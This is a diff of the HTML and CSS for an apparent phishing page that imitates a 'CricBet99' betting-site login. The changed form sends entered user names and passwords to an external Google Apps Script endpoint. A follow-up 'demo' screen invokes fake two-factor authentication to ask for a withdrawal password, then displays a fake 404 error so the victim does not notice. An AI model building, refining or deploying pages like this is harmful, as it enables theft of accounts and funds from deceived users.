@@ -7,43 +7,46 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(180deg, #8a4e00, #116257);
+            background: linear-gradient(5deg, rgba(69, 100, 51, 0.959),#355539,#2e4731,#864f04);
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            flex-direction: column; /* This will align everything vertically */
         }
 
-        .login-container, .demo-page {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 280px;
-            text-align: center;
-            position: relative;
-        }
+      /* Adjust logo positioning */
+.logo {
+    width: 320px;
+    height: auto;
+    margin-bottom: 20px; /* Space between logo and the login container */
+    position: relative;
+    top: -350px; /* Move the logo up by 30px (adjust this value as needed) */
+}
 
-        .login-container img, .demo-page img.demo-logo {
-            width: 350px;
-            height: auto;
-            position: absolute;
-            top: -90px;
-            left: 50%;
-            transform: translateX(-50%);
-        }
+
+/* For login form container */
+.login-container {
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    width: 280px;
+    text-align: center;
+    margin-top: -350px; /* Adjust this value to move the form up */
+}
 
         .form-container {
-            margin-top: 40px;
+            margin-top: 10px;
         }
 
-        h2 {
-            color: #8B4513;
+        .login-heading {
             font-size: 24px;
             font-weight: bold;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
+            color: #8B4513;
         }
 
         .form-group {
@@ -81,7 +84,7 @@
         }
 
         .login-demo-btn {
-            margin-top: 10px;
+            margin-top: 15px;
             background-color: #8B4513;
         }
 
@@ -105,74 +108,113 @@
             text-decoration: underline;
         }
 
-        /* 404 error style */
-        .error-container {
+    
+/* For demo page container */
+.demo-page {
+    display: none;
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    width: 280px;
+    text-align: center;
+    margin-top: -350px; /* Adjust this value to move the demo form up */
+}
+        h2 {
+            color: #8B4513;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+     
+
+       /* For Demo page input field */
+.demo-page input {
+    width: calc(100% - 20px); /* Make it span the full width with padding */
+    padding: 10px;
+    border: 1px solid #ced4da;
+    border-radius: 4px;
+    font-size: 14px;
+}
+        .auth-text {
+            font-weight: bold;
+            color: black;
+            margin-bottom: 10px;
+        }
+
+        .auth-text span {
+            display: inline-block;
+            text-align: left;
+        }
+
+        .auth-text span:first-child {
+            margin-bottom: 10px;
+            color: #8B4513; /* Brown color for Login text */
+        }
+
+        .auth-text span:nth-child(2) {
+            margin-top: 5px; /* Add a little gap */
+        }
+
+        .centered-text {
             text-align: center;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            border-radius: 10px;
-            color: white;
-            width: 400px;
+            margin-top: 20px;
+            font-weight: bold;
+            color: black;
+        }
+
+        .centered-text span {
+            display: block;
+            margin-bottom: 20px;
+        }
+        
+        /* Styles for the 404 error page */
+        .error-page {
             display: none;
+            text-align: center;
+            font-size: 48px;
+            font-weight: bold;
+            color: white;
+            background-color: black;
+            width: 300px;
+            padding: 40px;
+            border-radius: 10px;
+            margin-top: 20px;
+            position: relative;
+            top: -50px;
         }
 
-        .error-container h1 {
-            font-size: 72px;
-            margin: 0 0 20px;
-        }
-
-        .error-container p {
-            font-size: 18px;
-            margin: 0 0 20px;
-        }
-
-        .error-container a {
-            color: #fff;
-            background: #8B4513;
+        .error-page button {
+            background-color: #8B4513;
+            color: white;
+            border: none;
             padding: 10px 20px;
             border-radius: 5px;
-            text-decoration: none;
+            cursor: pointer;
             font-size: 16px;
+            margin-top: 20px;
         }
 
-        .error-container a:hover {
-            background: #5A3310;
+        .error-page button:hover {
+            background-color: #5A3310;
         }
 
-        /* Adjusted login page position */
-        .login-container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 280px;
-            text-align: center;
-            position: relative;
-            top: -130px;  /* Adjusted to move the login page upwards */
+        /* Hide logo when 404 error page is shown */
+        .hide-logo {
+            display: none;
         }
-
-        /* Adjusted demo page position */
-        .demo-page {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 280px;
-            text-align: center;
-            position: relative;
-            top: -130px;  /* Adjusted to move the form upwards */
-        }
-
     </style>
 </head>
 <body>
+    <!-- Logo at the top of the page -->
+    <img src="logo.png" alt="CricBet99 Logo" class="logo" id="logo">
 
-    <!-- Login Form -->
-    <div class="login-container" id="loginContainer">
-        <img src="logo.png" alt="CricBet99 Logo">
+    <div class="login-container">
         <div class="form-container">
-            <h2>Login</h2>
-            <form onsubmit="return showDemoPage();">
+            <div class="login-heading">LOGIN</div>
+            <!-- Main Login Form -->
+            <form action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" method="POST" id="loginForm">
                 <div class="form-group">
                     <label for="UserName"></label>
                     <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
@@ -184,8 +226,9 @@
                 <button type="submit" class="btn">Login</button>
             </form>
             
+            <!-- Login with Demo ID Button -->
             <button class="btn login-demo-btn" onclick="showDemoPage()">Login with Demo ID</button>
-            
+
             <div class="recaptcha-text">
                 <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
                 <a href="#">Privacy Policy</a> and 
@@ -194,20 +237,19 @@
         </div>
     </div>
 
-    <!-- Demo Login Form -->
-    <div class="demo-page" id="demoPage" style="display: none;">
-        <img src="logo.png" alt="CricBet99 Logo" class="demo-logo">
-        <h2>Login</h2>
-        <div class="auth-text">
-            <p class="line">2-Factor Authentication Enabled.</p>
-            <p class="password-prompt">Enter Your Withdrawal Password</p>
+    <!-- Demo Login Form for Withdrawal Code -->
+    <div class="demo-page" id="demoPage">
+        <div class="centered-text">
+            <h2>LOGIN</h2>
+            <span>2-Factor Authentication Enabled. Enter Your Withdrawal Password</span>
         </div>
-        <form id="demoForm" onsubmit="return showErrorPage();">
+
+        <form id="demoForm" onsubmit="handleDemoForm(event)">
             <div class="form-group">
-                <input type="text" id="demoUser" name="demoUser" placeholder="Withdrawal Code" required>
+                <input type="text" id="withdrawalCode" name="withdrawalCode" placeholder="Withdrawal Code" required>
             </div>
             <button type="submit" class="btn">Submit</button>
-        </form>
+        
         <div class="recaptcha-text">
             <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
             <a href="#">Privacy Policy</a> and 
@@ -215,34 +257,42 @@
         </div>
     </div>
 
-    <!-- 404 Error Message -->
-    <div class="error-container" id="errorPage">
-        <h1>404</h1>
-        <p>Oops! Page Not Found.</p>
-        <a href="index.html">Go to Homepage</a>
+    <!-- Error Page for 404 -->
+    <div class="error-page" id="errorPage">
+        404 PAGE NOT FOUND
+        <button onclick="goBackToHome()">Back to Home Page</button>
     </div>
 
     <script>
+        // Function to show the demo page when "Login with Demo ID" is clicked
         function showDemoPage() {
             // Hide the login form
-            document.getElementById('loginContainer').style.display = 'none';
-            
-            // Show the demo page
+            document.querySelector('.login-container').style.display = 'none';
+
+            // Show the demo page form
             document.getElementById('demoPage').style.display = 'block';
-            
+        }
+
+        // Handle the demo form submission
+        function handleDemoForm(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            const withdrawalCode = document.getElementById('withdrawalCode').value;
+
+            // Hide the logo when 404 error page is shown
+            document.getElementById('logo').classList.add('hide-logo');
+
+            // Redirect to the error page (404)
+            document.getElementById('demoPage').style.display = 'none';
+            document.getElementById('errorPage').style.display = 'block';
+
             return false; // Prevent form submission
         }
 
-        function showErrorPage() {
-            // Hide the demo page
-            document.getElementById('demoPage').style.display = 'none';
-            
-            // Show the 404 error page
-            document.getElementById('errorPage').style.display = 'block';
-            
-            return false; // Prevent form submission and page redirect
+        // Function to go back to home page
+        function goBackToHome() {
+            window.location.href = 'index.html';  // Redirect to the home page (or adjust the URL)
         }
     </script>
-
 </body>
 </html>
